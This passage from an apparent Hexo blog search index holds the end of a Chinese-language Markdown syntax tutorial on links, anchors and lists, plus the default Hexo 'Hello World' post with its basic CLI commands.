title="参考式"></a>参考式</h3><p>参考式超链接一般用在学术论文上面，或者另一种情况，如果某一个链接在文章中多处使用，那么使用引用 的方式创建链接将非常好，它可以让你对链接进行统一的管理。</p><p>语法说明：<br>参考式链接分为两部分，文中的写法 [链接文字][链接标记]，在文本的任意位置添加[链接标记]:链接地址 “链接标题”，链接地址与链接标题前有一个空格。</p><p>如果链接文字本身可以做为链接标记，你也可以写成[链接文字][]<br>[链接文字]：链接地址的形式，见代码的最后一行。</p><p>代码：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   我经常去的几个网站[<span class="string">Google</span>][<span class="symbol">1</span>]、[<span class="string">Leanote</span>][<span class="symbol">2</span>]以及[<span class="string">自己的博客</span>][<span class="symbol">3</span>]</span><br><span class="line">[<span class="string">Leanote 笔记</span>][<span class="symbol">2</span>]是一个不错的[<span class="string">网站</span>][<span class="symbol"></span>]。</span><br><span class="line"></span><br><span class="line">————————————————</span><br><span class="line">[<span class="symbol">1</span>]:<span class="link">http://www.google.com &quot;Google&quot;</span></span><br><span class="line">[<span class="symbol">2</span>]:<span class="link">http://www.leanote.com &quot;Leanote&quot;</span></span><br><span class="line">[<span class="symbol">3</span>]:<span class="link">http://http://blog.leanote.com/freewalk &quot;梵居闹市&quot;</span></span><br><span class="line">[<span class="symbol">网站</span>]:<span class="link">http://http://blog.leanote.com/freewalk</span></span><br></pre></td></tr></table></figure><h3 id="自动链接"><a href="#自动链接" class="headerlink" title="自动链接"></a>自动链接</h3><p>语法说明：<br>Markdown 支持以比较简短的自动链接形式来处理网址和电子邮件信箱，只要是用&lt;&gt;包起来， Markdown 就会自动把它转成链接。一般网址的链接文字就和链接地址一样，例如：</p><p>代码：</p> <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">&lt;http://example.com/&gt;</span></span><br><span class="line"><span class="language-xml">&lt;address@example.com&gt;</span></span><br></pre></td></tr></table></figure><h2 id="锚点"><a href="#锚点" class="headerlink" title="锚点"></a>锚点</h2><p>网页中，锚点其实就是页内超链接，也就是链接本文档内部的某些元素，实现当前页面中的跳转。比如我这里写下一个锚点，点击回到目录，就能跳转到目录。 在目录中点击这一节，就能跳过来。还有下一节的注脚。这些根本上都是用锚点来实现的。</p><p>注意： </p><p>1.Markdown Extra 只支持在标题后插入锚点，其它地方无效。</p><p>2.Leanote 编辑器右侧显示效果区域暂时不支持锚点跳转，所以点来点去发现没有跳转不必惊慌，但是你发布成笔记或博文后是支持跳转的。</p><p>代码:</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">跳转到[<span class="string">目录</span>](<span class="link">#index</span>)</span><br></pre></td></tr></table></figure><p>显示效果：<br>跳转到<a href="#index">目录</a></p><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><p>使用 *，+，- 表示无序列表。</p><p>代码：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">*</span> 无序列表项 一</span><br><span class="line"><span class="bullet">*</span> 无序列表项 二</span><br><span class="line"><span class="bullet">*</span> 无序列表项 三</span><br></pre></td></tr></table></figure><p>显示效果：</p><pre><code>* 无序列表项 一* 无序列表项 二* 无序列表项 三</code></pre><h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><p>有序列表则使用数字接着一个英文句点。</p><p>代码：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 有序列表项 三</span><br><span class="line"><span class="bullet">2.</span> 有序列表项 三</span><br><span class="line"><span class="bullet">3.</span> 有序列表项 三</span><br></pre></td></tr></table></figure><p>显示效果：</p><p>1.有序列表项 一</p><p>2.有序列表项 二</p><p>3.有序列表项 三</p><h3 id="定义型列表"><a href="#定义型列表" class="headerlink" title="定义型列表"></a>定义型列表</h3><p>语法说明：<br>定义型列表由名词和解释组成。一行写上定义，紧跟一行写上解释。解释的写法:紧跟一个缩进(Tab)</p><p>代码：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Markdown</span><br><span class="line">:    轻量级文本标记语言，可以转换成html，pdf等格式（左侧有一个可见的冒号和四个不可见的空格）</span><br><span class="line">代码块 2</span><br><span class="line">:   这是代码块的定义（左侧有一个可见的冒号和四个不可见的空格）</span><br><span class="line"><span class="code">        代码块（左侧有八个不可见的空格）</span></span><br></pre></td></tr></table></figure><p>显示效果：</p><p>Markdown</p><p>:    轻量级文本标记语言，可以转换成html，pdf等格式</p><p>代码块 2</p><p>:   这是代码块的定义</p><pre><code>    代码块</code></pre><h3 id="列表缩进"><a href="#列表缩进" class="headerlink" title="列表缩进"></a>列表缩进</h3><p>语法说明：</p><p>列表项目标记通常是放在最左边，但是其实也可以缩进，最多 3 个空格，项目标记后面则一定要接着至少一个空格或制表符。</p><p>要让列表看起来更漂亮，你可以把内容用固定的缩进整理好（显示效果与代码一致）：</p><pre><code>轻轻的我走了， 正如我轻轻的来； 我轻轻的招手， 作别西天的云彩。 那河畔的金柳， 是夕阳中的新娘； 波光里的艳影， 在我的心头荡漾。 软泥上的青荇， 油油的在水底招摇； 在康河的柔波里， 我甘心做一条水草！那榆荫下的一潭， 不是清泉， 是天上虹； 揉碎在浮藻间， 沉淀着彩虹似的梦。 寻梦？撑一支长篙， 向青草更青处漫溯； 满载一船星辉， 在星辉斑斓里放歌。 但我不能放歌， 悄悄是别离的笙箫； 夏虫也为我沉默， 沉默是今晚的康桥！ 悄悄的我走了， 正如我悄悄的来； 我挥一挥衣袖， 不带走一片云彩。</code></pre><p>但是如果你懒，那也行：</p><p>代码： </p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">*</span>   轻轻的我走了， 正如我轻轻的来； 我轻轻的招手， 作别西天的云彩。</span><br><span class="line">那河畔的金柳， 是夕阳中的新娘； 波光里的艳影， 在我的心头荡漾。 </span><br><span class="line">软泥上的青荇， 油油的在水底招摇； 在康河的柔波里， 我甘心做一条水草！ </span><br><span class="line"><span class="bullet">*</span>   那榆荫下的一潭， 不是清泉， 是天上虹； 揉碎在浮藻间， 沉淀着彩虹似的梦。 </span><br><span class="line">寻梦？撑一支长篙， 向青草更青处漫溯； 满载一船星辉， 在星辉斑斓里放歌。 </span><br><span class="line">但我不能放歌， 悄悄是别离的笙箫； 夏虫也为我沉默， 沉默是今晚的康桥！ </span><br><span class="line">悄悄的我走了， 正如我悄悄的来； 我挥一挥衣袖， 不带走一片云彩。</span><br></pre></td></tr></table></figure><p>显示效果：</p><ul><li>轻轻的我走了， 正如我轻轻的来； 我轻轻的招手， 作别西天的云彩。<br>那河畔的金柳， 是夕阳中的新娘； 波光里的艳影， 在我的心头荡漾。<br>软泥上的青荇， 油油的在水底招摇； 在康河的柔波里， 我甘心做一条水草！ </li><li>那榆荫下的一潭， 不是清泉， 是天上虹； 揉碎在浮藻间， 沉淀着彩虹似的梦。<br>寻梦？撑一支长篙， 向青草更青处漫溯； 满载一船星辉， 在星辉斑斓里放歌。<br>但我不能放歌， 悄悄是别离的笙箫； 夏虫也为我沉默， 沉默是今晚的康桥！<br>悄悄的我走了， 正如我悄悄的来； 我挥一挥衣袖， 不带走一片云彩。</li></ul><h3 id="包含段落的列表"><a href="#包含段落的列表" class="headerlink" title="包含段落的列表"></a>包含段落的列表</h3><p>语法说明：</p><p>列表项目可以包含多个段落，每个项目下的段落都必须缩进 4 个空格或是 1 个制表符（显示效果与代码一致）：</p><p>轻轻的我走了， 正如我轻轻的来； 我轻轻的招手， 作别西天的云彩。<br>那河畔的金柳， 是夕阳中的新娘； 波光里的艳影， 在我的心头荡漾。<br>软泥上的青荇， 油油的在水底招摇； 在康河的柔波里， 我甘心做一条水草！</p><p>那榆荫下的一潭， 不是清泉， 是天上虹； 揉碎在浮藻间， 沉淀着彩虹似的梦。<br>寻梦？撑一支长篙， 向青草更青处漫溯； 满载一船星辉， 在星辉斑斓里放歌。<br>但我不能放歌， 悄悄是别离的笙箫； 夏虫也为我沉默， 沉默是今晚的康桥！</p><p>悄悄的我走了， 正如我悄悄的来； 我挥一挥衣袖， 不带走一片云彩。</p><p>如果你每行都有缩进，看起来会看好很多，当然，再次地，如果你很懒惰，Markdown 也允许：</p><p>代码：</p><pre><code>    *   轻轻的我走了， 正如我轻轻的来； 我轻轻的招手， 作别西天的云彩。    那河畔的金柳， 是夕阳中的新娘； 波光里的艳影， 在我的心头荡漾。     软泥上的青荇， 油油的在水底招摇； 在康河的柔波里， 我甘心做一条水草！        那榆荫下的一潭， 不是清泉， 是天上虹； 揉碎在浮藻间， 沉淀着彩虹梦。     寻梦？撑一支长篙， 向青草更青处漫溯； 满载一船星辉， 在星辉斑斓里放歌。     但我不能放歌， 悄悄是别离的笙箫； 夏虫也为我沉默， 沉默是今晚的康桥！    *    悄悄的我走了， 正如我悄悄的来； 我挥一挥衣袖， 不带走一片云彩。</code></pre><p>显示效果：</p><ul><li>轻轻的我走了， 正如我轻轻的来； 我轻轻的招手， 作别西天的云彩。<br>那河畔的金柳， 是夕阳中的新娘； 波光里的艳影， 在我的心头荡漾。<br>软泥上的青荇， 油油的在水底招摇； 在康河的柔波里， 我甘心做一条水草！<br>那榆荫下的一潭， 不是清泉， 是天上虹； 揉碎在浮藻间， 沉淀着彩虹梦。</li></ul><p>寻梦？撑一支长篙， 向青草更青处漫溯； 满载一船星辉， 在星辉斑斓里放歌。<br>但我不能放歌， 悄悄是别离的笙箫； 夏虫也为我沉默， 沉默是今晚的康桥！</p><ul><li>悄悄的我走了， 正如我悄悄的来； 我挥一挥衣袖， 不带走一片云彩。</li></ul><h3 id="包含引用的列表"><a href="#包含引用的列表" class="headerlink" title="包含引用的列表"></a>包含引用的列表</h3><p>语法说明：</p><p>如果要在列表项目内放进引用，那 &gt; 就需要缩进：<br>代码：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">*</span>   阅读的方法:</span><br><span class="line"></span><br><span class="line"><span class="code">    &gt; 打开书本。</span></span><br><span class="line"><span class="code">    &gt; 打开电灯。</span></span><br></pre></td></tr></table></figure><p>显示效果：</p><ul><li><p>阅读的方法:</p><blockquote><p>打开书本。<br>打开电灯。</p></blockquote></li></ul><h3 id="包含代码区块的引用"><a href="#包含代码区块的引用" class="headerlink" title="包含代码区块的引用"></a>包含代码区块的引用</h3><p>语法说明：<br>如果要放代码区块的话，该区块就需要缩进两次，也就是 8 个空格或是 2 个制表符：</p><p>一列表项包含一个列表区块：</p><pre><code>    &lt;代码写在这&gt;</code></pre><h3 id="一个特殊情况"><a href="#一个特殊情况" class="headerlink" title="一个特殊情况"></a>一个特殊情况</h3><p>在特殊情况下，项目列表很可能会不小心产生，像是下面这样的写法：</p><pre><code>    1986. What a great season.</code></pre><p>会显示成：</p><p>What a great season.</p><p> 换句话说，也就是在行首出现数字-句点-空白，要避免这样的状况，你可以在句点前面加上反斜杠：</p><pre><code>    1986\. What a great season.</code></pre><p>会显示成：</p><p>1986. What a great season.</p>]]></content>
      
      
      <categories>
          
          <category> MarkDown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MarkDown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/post/4a17b156.html"/>
      <url>/post/4a17b156.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
